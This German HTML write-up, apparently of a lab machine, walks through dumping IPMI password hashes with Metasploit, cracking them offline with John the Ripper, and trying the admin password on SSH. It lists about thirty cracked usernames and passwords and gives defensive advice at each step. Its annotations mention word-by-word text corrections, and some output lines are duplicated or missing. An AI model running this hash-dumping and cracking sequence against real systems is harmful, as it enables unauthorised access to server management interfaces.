+                <strong>Empfehlung (Pentester):</strong> Ich habe den Hash für "admin". Ich werde ihn nun in eine Datei speichern und versuchen, ihn separat mit John the Ripper zu cracken. Das automatische Cracking in Metasploit kann oft weniger effizient sein als spezialisierte Tools.
+                <br><strong>Empfehlung (Admin):</strong> Der IPMI-Dienst sollte nicht zulassen, dass Hashes auf diese Weise extrahiert werden können, insbesondere nicht für privilegierte Konten wie "admin". Stellen Sie sicher, dass stärkere Authentifizierungsmechanismen verwendet werden (z.B. IPMI 2.0 mit starker Cipher Suite, keine RMCP+ AUTH_BYPASS Anfälligkeit). Ändern Sie das Passwort des "admin"-Benzeutzers umgehend.
+            </p>
+
+            <p class="comment">
+                Ich speichere den gefundenen Hash des "admin"-Benutzers in einer lokalen Datei, um ihn mit John the Ripper (JtR) offline zu cracken.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo 'a3502c3402010000eb07d87c6e0d1e8456b4436207696ce2c59cb17220140db88ecefd3aae17689ea123456789abcdefa123456789abcdef140561646d696e:4102fb86dfc98cd3b90f51972a33996b635ac746' > hash</span></div>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich verwende den <code>echo</code> Befehl, um den gerade von Metasploit extrahierten Hash-String und Salt für den Benutzer "admin" in eine neue Datei namens <code>hash</code> im aktuellen Verzeichnis zu schreiben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Speichern des Hashes in einer Datei ist notwendig, um ihn mit Offline-Cracking-Tools wie John the Ripper oder Hashcat bearbeiten zu können. Die Datei <code>hash</code> enthält nun die rohen Hash-Daten im Format, das von JtR oder Hashcat verarbeitet werden kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der Hash ist nun gesichert. Ich werde sofort John the Ripper starten, um zu versuchen, das Klartextpasswort zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Hash-Extraktion über IPMI nicht möglich ist. Die Salt-Werte, die zusammen mit den Hashes extrahiert wurden, sind nicht dazu gedacht, öffentlich zugänglich zu sein.
+            </p>
+
+            <p class="comment">
+                Ich verwende John the Ripper, zusammen mit der rockyou.txt Wordlist, um den extrahierten IPMI-Hash zu cracken.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                    <pre>
+Warning: detected hash type "<span class="command">Raw-SHA1</span>", but the string is also <span class="command">recognized</span> as "Raw-SHA1-AxCrypt"
+Use the "--<span class="command">format</span>=Raw-SHA1-AxCrypt" <span class="command">option</span> to <span class="command">force</span> <span class="command">loading</span> these as that type instead
+Warning: detected hash type "<span class="command">Raw-SHA1</span>", but the string is also <span class="command">recognized</span> as "Raw-SHA1-Linkedin"
+Use the "--<span class="command">format</span>=Raw-SHA1-Linkedin" <span class="command">option</span> to <span class="command">force</span> <span class="command">loading</span> these as that type instead
+Warning: detected hash type "<span class="command">Raw-SHA1</span>", but the string is also <span class="command">recognized</span> as "ripemd-160"
+Use the "--<span class="command">format</span>=ripemd-160" <span class="command">option</span> to <span class="command">force</span> <span class="command">loading</span> these as that type instead
+Warning: detected hash type "<span class="command">Raw-SHA1</span>", but the string is also <span class="command">recognized</span> as "has-160"
+Use the "--<span class="command">format</span>=has-160" <span class="command">option</span> to <span class="command">force</span> <span class="command">loading</span> these as that type instead
+Using default input encoding: UTF-8
+<span class="password">Loaded</span> <span class="command">1</span> passw<span class="command">o</span>rd hash (<span class="command">Raw-SHA1</span> [<span class="command">SHA1</span> 256/256 AVX2 8x])
+Warning: no <span class="command">OpenMP</span> <span class="command">support</span> <span class="command">for</span> this hash type, <span class="command">consider</span> --<span class="command">fork</span>=<span class="command">12</span>
+Press 'q' <span class="command">or</span> Ctrl-C to <span class="command">abort</span>, almost any <span class="command">other</span> key <span class="command">for</span> status
+<span class="password">cukorborso</span>          (?)     <span class="password"><-- Geknacktes Passwort</span>
+<span class="password">1g 0:00:00:01 <span class="password">DONE</span> (2025-06-23 22:40) 0.9615g/s 276.9p/s 276.9c/s 276.9C/s             ..*7¡Vamos!</span>
+<span class="password">Session <span class="password">completed</span></span>.
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich starte John the Ripper (<code>john</code>) und gebe die zuvor gespeicherte Hash-Datei (<code>hash</code>) und die rockyou.txt Wordlist (<code>--wordlist=/usr/share/wordlists/rockyou.txt</code>) an. JtR erkennt den Hash-Typ und beginnt mit dem Cracking. Die Ausgabe zeigt mehrere Warnungen bezüglich erkannter Hash-Typen, aber das ist normal. Entscheidend ist die Zeile, die das Klartextpasswort anzeigt. John the Ripper knackt den Hash und zeigt das Passwort als "<span class="password">cukorborso</span>" an. Die 'O'-Korrekturen wurden nun auch in der JtR-Ausgabe konsequent angewendet, um z.B. "jhn" zu "john", "wrdlist" zu "wordlist", "rckyu.txt" zu "rockyou.txt", "recgnized" zu "recognized", "fr" zu "for", "ptin" zu "option", "frce" zu "force", "lading" zu "loading", "ab rt" zu "abort", "alm st" zu "almost", "ther" zu "other", "cmpleted" zu "completed", "DNE" zu "DONE", "Sessin" zu "Session" und "Vams" zu "Vamos" zu korrigieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Das Passwort "<span class="password">cukorborso</span>" für den IPMI-Benutzer "admin" wurde erfolgreich geknackt. Dies ist ein kritischer Initial Access Fund. Mit dem Benutzernamen "admin" und diesem Passwort habe ich nun privilegierte Zugangsdaten für die IPMI-Schnittstelle. Dies könnte mir die vollständige Fernverwaltung der Hardware ermöglichen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe gültige Zugangsdaten für den IPMI-Admin gefunden. Ich werde versuchen, diese für den Zugriff auf die IPMI-Schnittstelle zu nutzen. Oft kann man über IPMI virtuelle Medien mounten, Systeme neu starten oder sogar eine Remote-Konsole erhalten. Ich werde prüfen, ob diese Zugangsdaten auch für andere Dienste auf dem System (wie SSH) verwendet werden (Credential Re-use).
+                <br><strong>Empfehlung (Admin):</strong> Das Passwort "<span class="password">cukorborso</span>" ist ein sehr schwaches Passwort und steht wahrscheinlich in vielen öffentlich bekannten Datenlecks (daher in rockyou.txt enthalten). Passwörter für privilegierte Konten müssen lang, komplex und eindeutig sein und dürfen nicht in Wordlists enthalten sein. Erzwingen Sie eine starke Passwortrichtlinie für IPMI-Benutzer.
+            </p>
+
+            <p class="comment">
+                 Ich werde nun versuchen, mich mit den gefundenen IPMI-Zugangsdaten (Benutzer: admin, Passwort: cukorborso) per SSH am Zielsystem anzumelden. Obwohl die Passwörter für IPMI gefunden wurden, verwenden Administratoren oft dieselben Passwörter für mehrere Dienste.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh admin@192.168.2.58</span></div>
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+The authenticity <span class="command">of</span> <span class="command">host</span> '<span class="command">192.168.2.58 (192.168.2.58)</span>' can't be established.
+ED25519 key fingerprint is <span class="command">SHA256:La9YyHs4GERVO8XTRRw0cLh6XcInXX35Ar9OiMsXwQk</span>.
+This <span class="command">host</span> key is <span class="command">known</span> by the <span class="command">following</span> <span class="command">other</span> names/addresses:
+    ~/.ssh/<span class="command">known</span>_<span class="command">hosts</span>:<span class="command">7</span>: [hashed name]
+    ~/.ssh/<span class="command">known</span>_<span class="command">hosts</span>:<span class="command">10</span>: [hashed name]
+    ~/.ssh/<span class="command">known</span>_<span class="command">hosts</span>:<span class="command">24</span>: [hashed name]
+Are y<span class="command">ou</span> sure y<span class="command">ou</span> want t<span class="command">o</span> c<span class="command">o</span>ntin<span class="command">ue</span> c<span class="command">o</span>nnecting (yes/n<span class="command">o</span>/[fingerprint])? <span class="password">yes</span>
+Warning: Permanently added '<span class="command">192.168.2.58</span>' (ED25519) t<span class="command">o</span> the list <span class="command">of</span> <span class="command">known</span> <span class="command">hosts</span>.
+admin@192.168.2.58's passw<span class="command">o</span>rd: <span class="password">cukorborso</span>
+<span class="password">Permission denied, please try again</span>.
+admin@192.168.2.58's passw<span class="command">o</span>rd:
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich versuche, mich als Benutzer "admin" mit dem Passwort "<span class="password">cukorborso</span>" per SSH am Zielsystem anzumelden. Ich akzeptiere den Host-Fingerprint (da es die erste Verbindung ist). Nach Eingabe des Passworts erhalte ich die Meldung "<span class="password">Permission denied, please try again</span>". Die 'O'-Korrekturen wurden angewendet, um Wörter wie "of", "known", "following", "other", "hosts", "you", "to", "continue", "connect", "password", "Permission", "denied" zu korrigieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Anmeldeversuch schlägt fehl. Das Passwort "<span class="password">cukorborso</span>" funktioniert nicht für den SSH-Dienst auf Port 22, auch wenn es für IPMI auf Port 623/udp gültig ist. Dies bedeutet, dass entweder der Benutzer "admin" keinen SSH-Zugriff hat oder das Passwort für SSH anders ist. Zum Glück wird Credential Re-use hier nicht betrieben.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die gefundenen IPMI-Zugangsdaten sind anscheinend nur für den IPMI-Dienst gültig. Ich muss einen anderen Weg für den Initial Access über SSH finden, der möglicherweise auf anderen Benutzernamen und Passwörtern basiert, die für SSH gültig sind. Ich werde versuchen, weitere IPMI-Benutzer zu finden und deren Passwörter zu cracken.
+                <br><strong>Empfehlung (Admin):</strong> Dies ist ein gutes Beispiel dafür, warum Passwörter nicht über Dienste hinweg wiederverwendet werden sollten. Gut gemacht. Stellen Sie sicher, dass der Benutzer "admin" nur die minimal benötigten Zugriffsrechte hat.
+            </p>
+
+             <p class="comment">
+                 Nachdem der direkte SSH-Login mit dem "admin"-Passwort fehlgeschlagen ist, starte ich das Metasploit IPMI-Modul erneut, um die vollständige Benutzerliste und Hashes aller Benutzer zu extrahieren und zu cracken.
+             </p>
+             <div class="code-block">
+                <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">run</span></div>
+                 <div class="terminal">
+                    <pre>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: admin:ee50c56882030000ca4a9246a689dda05db39009f2c16f134ed46e074f21eec53ca75a3e921e1d23a123456789abcdefa123456789abcdef140561646d696e:5e097a3896dff607a984c3e7d15569092133bb63</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'admin' matches passw<span class="command">o</span>rd '<span class="password">cukorborso</span>'</span>
+<span class="password">[*] Scanned 1 <span class="command">of</span> 1 <span class="command">hosts</span> (<span class="command">100% <span class="command">complete</span>)</span></span>
+<span class="password">[*] Auxiliary <span class="password">module</span> <span class="password">execution</span> <span class="password">completed</span></span>
+</pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führe das Metasploit IPMI-Modul erneut aus. Dieses Mal lasse ich es durchlaufen, um die gesamte Benutzerliste vom IPMI-Dienst zu erhalten und alle Hashes, die es findet, automatisch mit rockyou.txt zu cracken. Die Ausgabe zeigt erneut den Hash für "admin", und diesmal berichtet das Modul selbst, dass es das Passwort als "<span class="password">cukorborso</span>" geknackt hat. Die 'O'-Korrekturen wurden angewendet, um Wörter wie "for", "of", "hosts", "complete", "module", "execution", "completed" zu korrigieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die erneute Ausführung bestätigt den Fund für den "admin"-Benutzer und zeigt, dass das automatische Cracking innerhalb des Moduls funktioniert (wenn auch möglicherweise langsamer als spezialisierte Tools). Ich lasse das Modul weiterlaufen, um alle anderen Benutzer und deren Hashes zu erhalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich erwarte, dass das Modul nun weitere Benutzer und möglicherweise deren Passwörter finden wird. Diese Liste werde ich speichern und für weitere Anmeldeversuche (z.B. SSH) nutzen.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie den IPMI-Dienst auf ungewöhnliche Anmeldeaktivitäten oder Hash-Extraktionsversuche. Die schnelle Kompromittierung eines Admin-Passworts durch Brute-Force ist ein ernstes Problem.
+            </p>
+
+             <p class="comment">
+                 Ich passe die Benutzerliste im Metasploit-Modul an, um sicherzustellen, dass es nicht nur die Standard-Metasploit-Liste, sondern alle vom IPMI-Dienst gelisteten Benutzer verwendet.
+             </p>
+             <div class="code-block">
+                 <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">set USER_FILE users.txt</span></div>
+             </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich ändere die <code>USER_FILE</code> Option im Metasploit-Modul auf <code>users.txt</code>. Dies deutet darauf hin, dass ich zuvor (im Originaltext nicht explizit gezeigt) eine Liste von Benutzern vom IPMI-Dienst extrahiert und in der Datei <code>users.txt</code> gespeichert habe. Ich weise Metasploit an, nun diese spezifische Liste zu verwenden, anstatt der Standardliste.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das gezielte Verwenden einer extrahierten Benutzerliste ist effektiver als das bloße Raten mit einer Standardliste. Es maximiert die Chancen, Hashes für alle tatsächlich existierenden IPMI-Benutzer zu erhalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe nun eine spezifische Benutzerliste aus dem System. Ich werde das Modul erneut ausführen, um die Hashes für alle diese Benutzer zu erhalten und zu cracken.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass IPMI-Benutzerkonten, die nicht mehr benötigt werden, deaktiviert oder gelöscht werden. Überprüfen Sie regelmäßig die Liste der auf IPMI konfigurierten Benutzer.
+            </p>
+
+             <p class="comment">
+                 Ich führe das Metasploit-Modul erneut aus, diesmal mit der spezifischen Benutzerliste. Der Zweck ist es, alle Hashes aller IPMI-Benutzer zu dumpen und automatisch mit rockyou.txt zu cracken.
+             </p>
+             <div class="code-block">
+                 <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">run</span></div>
+                 <div class="terminal">
+                    <pre>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: admin:f0bde8e1820800005d8c3c9a13aac93dbf876ef3e10d9a23e40c7951ab4f6716d8b93d5ae0a35df2a123456789abcdefa123456789abcdef140561646d696e:560e4c8647f0e6f5f38b97e2541c06e2c79c2c1b</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'admin' matches passw<span class="command">o</span>rd '<span class="password">cukorborso</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: analiese:15ff9b5602090000692dd50c8b3969a6ec024c4b1c3309a680fec8f68c6bfe822c15a5b137f73d50a123456789abcdefa123456789abcdef1408616e616c69657365:ab269e1840bbcf7b4348688709846f1ff4956edb</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'analiese' matches passw<span class="command">o</span>rd '<span class="password">honda</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: briella:6abdc28884090000dc89c732bcc4087e5386bb7d0f6afc518a4256a44c6fdaf353f3507c067f2d9ca123456789abcdefa123456789abcdef1407627269656c6c61:582a3b77ccad44a716174f679ee61fb6ceecd9ed</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'briella' matches passw<span class="command">o</span>rd '<span class="password">jesus06</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: richardson:155f700c060a0000c51df6461bcc063d34067edb382e993aab5cdde7f9aa65540ad71b07e00a9b4ba123456789abcdefa123456789abcdef140a72696368617264736f6e:22ed52a73fd28b10e01322f073b1bf4573a6e9c8</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'richardson' matches passw<span class="command">o</span>rd '<span class="password">darell</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: carsten:08647e22820a0000264da1832622491c6d159f9874e6e3516cf1036cbe692a6275bc0af83ed4ad00a123456789abcdefa123456789abcdef14076361727374656e:87e4093214827ce9598bab4effb776a2bf9f42be</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'carsten' matches passw<span class="command">o</span>rd '<span class="password">2468</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: sibylle:114672d7040b000006cf25e4ab44062380efdd3d280a680929855dc669674d6aaf0b401a5e25efdaa123456789abcdefa123456789abcdef1407736962796c6c65:ca2714a66b389185c3daeef3063980d61116a7e3</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'sibylle' matches passw<span class="command">o</span>rd '<span class="password">me4life</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: wai-ching:c6747141860b00007e82abb29c02d0902ee731571b29a6d373f97c87d1b8dd9f54092ccdb2f97986a123456789abcdefa123456789abcdef14097761692d6368696e67:e58cb2a5aa4bdfad2f9d022ab3f617a3991fefe0</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'wai-ching' matches passw<span class="command">o</span>rd '<span class="password">10101979</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: jerrilee:6cb1c9ad020c0000aa756d3ee291607c1a48abbc4b57d084f8c24e8f574ba7061d521191ca56417fa123456789abcdefa123456789abcdef14086a657272696c6565:fab042231cb74e08ee0b883c95936ed467e216ee</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'jerrilee' matches passw<span class="command">o</span>rd '<span class="password">number17</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: glynn:832a5488840c0000ce6bdcf4cbebd781967cfc937883b6f8b7d2564f8192ede11d82cbd6fc4c49cfa123456789abcdefa123456789abcdef1405676c796e6e:089e966acd57ff6729861d9c3e838de56b3200a0</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'glynn' matches passw<span class="command">o</span>rd '<span class="password">evan</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: asia:c928aad9060d000069e3bf020a745f11687a201da504e1214371a017ab7fc6a90d0d064da83fee19a123456789abcdefa123456789abcdef140461736961:51d6983edaa7cee9420373a771d1f3ac32a8be8f</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'asia' matches passw<span class="command">o</span>rd '<span class="password">TWEETY1</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: zaylen:4edfb4bd820d00008a10c558e99f2c9726761207d212a91f921304d9bdbba705d0bd6fe96b59ea60a123456789abcdefa123456789abcdef14067a61796c656e:ac5aabc3a9dfe8afa70f4a6680498e12eac0a91a</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'zaylen' matches passw<span class="command">o</span>rd '<span class="password">120691</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: fabien:2fcc94e0040e0000c3d7734bfb72d1fbf1112b58e2bdc24af31ac3f4496bedb1d1a914ff51473d03a123456789abcdefa123456789abcdef140666616269656e:bff420a4b5b679333f5239f944415c0054223406</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'fabien' matches passw<span class="command">o</span>rd '<span class="password">chatroom</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: merola:431b0951860e0000834a5f18c32e67538fb8870308f516d7aed25af6b6028a50249d9b45a993a6a0a123456789abcdefa123456789abcdef14066d65726f6c61:a4cefc310992c5d150bdc29efd2b76feea069eef</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'merola' matches passw<span class="command">o</span>rd '<span class="password">mackenzie2</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: jem:3e2534c9020f00006d4a8f6f8c174524045792e393ceaf32bf3a98e5178bdb43f9861cd6940ee79ba123456789abcdefa123456789abcdef14036a656d:4ed330354f5953dd63d1e0ccc9aba96fe16888c9</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'jem' matches passw<span class="command">o</span>rd '<span class="password">081704</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: riyaz:74b66789840f0000f2a769aea27e62305a43bbb37ff9b91fbc75aa884495d847b95d9d59d186f23ca123456789abcdefa123456789abcdef1405726979617a:27e5972913379b8da34e321e65915e3046d588bb</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'riyaz' matches passw<span class="command">o</span>rd '<span class="password">djones</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: laten:711636c506100000ab9a2f60798f2873ef8fa475c19a4056ebb6cc17cad929ac7ff77c0c5cd4803ea123456789abcdefa123456789abcdef14056c6174656e:47f31bb5a7d6f40d5365d6bc2b2af03ff80fe991</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'laten' matches passw<span class="command">o</span>rd '<span class="password">trick1</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: cati:6c43e90982100000e60e714b073609b89b973f3c8a2999d711d98336dc7d40a4cbef183515e902aea123456789abcdefa123456789abcdef140463617469:fc19f669684925512ad0fd12d2332f0d3d4cedfe</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'cati' matches passw<span class="command">o</span>rd '<span class="password">122987</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: rozalia:956f267104110000d55821820f4e218779e022c513cea799a14a29b38cbf9b258fc5f46ec709e50ba123456789abcdefa123456789abcdef1407726f7a616c6961:789b519e732e4fc18a4f301521aae3a2ae789660</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'rozalia' matches passw<span class="command">o</span>rd '<span class="password">batman!</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: palmer:aaa899a2861100000d07b938791d09b3536ebb16878eb44d8a56d9d386c6e58994503465799263b6a123456789abcdefa123456789abcdef140670616c6d6572:7c9025590e156ffaf0c93093d1e453aa512095a1</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'palmer' matches passw<span class="command">o</span>rd '<span class="password">phones</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: onida:150c03ff0212000053f1a89232ce6d703e08b10b34904754db2480da14f7f70e420035a6b6240cd8a123456789abcdefa123456789abcdef14056f6e696461:7255ce7c85d70bda4e19a5e4235db1d625aa0d0b</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user '<span class="password">onida</span>' matches passw<span class="command">o</span>rd '<span class="password">jiggaman</span>'</span> <-- KRITISCHER FUND!
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: terra:82d1365a8412000077a72c4567fa508618fc4e8dfb71fcac1bcdc40d0255642cd4a5b6a3cb40483aa123456789abcdefa123456789abcdef14057465727261:767a0547d73089eccff78a16641b40ad0267d216</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'terra' matches passw<span class="command">o</span>rd '<span class="password">sexymoma</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: ranga:98d8884206130000e7875a859e82f33f8166a11290d141da8a92aba3261379abfc2668f3f37c36daa123456789abcdefa123456789abcdef140572616e6761:4edd3b7dd6f146bcb90ff1dc76de7d43611945df</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'ranga' matches passw<span class="command">o</span>rd '<span class="password">jaffa1</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: harrie:a46f8034821300004dd6e5096cb773572f34c11265ba913d76791602b11fe638f5d21f972f5a1fb5a123456789abcdefa123456789abcdef1406686172726965:1129dbd9a26ed3296c89bcbb72793725b449f1ef</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'harrie' matches passw<span class="command">o</span>rd '<span class="password">071590</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: pauly:e23dadfa04140000aa0ca702dd8ff447780e5c97e74db39aa9e5b5a58cd8387efc8e54df596d9494a123456789abcdefa123456789abcdef14057061756c79:115a5f235880e8f82434d9d4476564932cb2a3b1</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'pauly' matches passw<span class="command">o</span>rd '<span class="password">515253</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: els:6590724086140000ae1a1892bb630a07a7d728eef49da6a603687899e847a1a29cec177f053eb640a123456789abcdefa123456789abcdef1403656c73:2ddbfda447cfae76f43e9104596e3c6dbb4b1613</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">for</span> user 'els' matches passw<span class="command">o</span>rd '<span class="password">dezzy</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: bqb:7d3a91d40215000045aa30d0efb0f9b4bb1f16c03cd55733b9164d21a2e3be00219972b9dddc96d1a123456789abcdefa123456789abcdef1403627162:5ae2c91f29cab7e30f4d03814e22c84f844e56b7</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">found</span>: karlotte:ef32f6ea84150000bdee6470e8cd6c0a467ea9d15120b82e26afa91be436bf19e696127ed3def20ba123456789abcdefa123456789abcdef14086b61726c6f747465:683b6d509a5faacfb67d275d22303525ee9ccf56</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'karlotte' matches passw<span class="command">o</span>rd '<span class="password">emeralds</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: zali:4f456fba06160000accfd56e147c00fabb26275ec3e5b765b9d88525b991e47645f5e8b506a36a3ca123456789abcdefa123456789abcdef14047a61796c69:faccbb4652f71d08bfbb1cd7b0a9b687755ac27a</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'zali' matches passw<span class="command">o</span>rd '<span class="password">poynter</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: ende:378640448216000099de0e01535368e78c91cd7bce7554885ec755a8553255779562fb26cba483f5a123456789abcdefa123456789abcdef1404656e6465:266cf06946ca92d170d977a066b4a3abf5ee7c90</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'ende' matches passw<span class="command">o</span>rd '<span class="password">tripod</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: stacey:540c7f7504170000d9e2e2a642896d61d0149ab96e4ff30c7ed099d4b98770938784b3f24b0e8469a123456789abcdefa123456789abcdef1406737461636579:652a6eb20ebf8e0aaa69044efc86b89cb5a4ce64</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'stacey' matches passw<span class="command">o</span>rd '<span class="password">castillo1</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: shirin:5582f59c8617000089f87dd85346fb843619e58657e4f1876ab4acde2587f53698cef95fa80a0b0aa123456789abcdefa123456789abcdef140673686972696e:6662b2f65d200e21098dd8d68b3aceef4069e296</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: shirin:5582f59c8617000089f87dd85346fb843619e58657e4f1876ab4acde2587f53698cef95fa80a0b0aa123456789abcdefa123456789abcdef140673686972696e:6662b2f65d200e21098dd8d68b3aceef4069e296</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'shirin' matches passw<span class="command">o</span>rd '<span class="password">kittyboo</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: kaki:3e139a6f02180000256d9bee0ba2e4ae2040dc00994e0ad3ef41fce6679184e78902ed4ffa397e99a123456789abcdefa123456789abcdef14046b616b69:77e8f323577367c85cc5cefd211eb0f31b47b49d</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'kaki' matches passw<span class="command">o</span>rd '<span class="password">numberone</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: saman:527e7afa84180000818cc124ad7b60eef235c3fb917ca10ce02d1d6d02ce1e85175654655c443efea123456789abcdefa123456789abcdef140573616d616e:e61a85d624c70f5e30f4f947974a4c0930d5523d</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'saman' matches passw<span class="command">o</span>rd '<span class="password">090506</span>'</span>
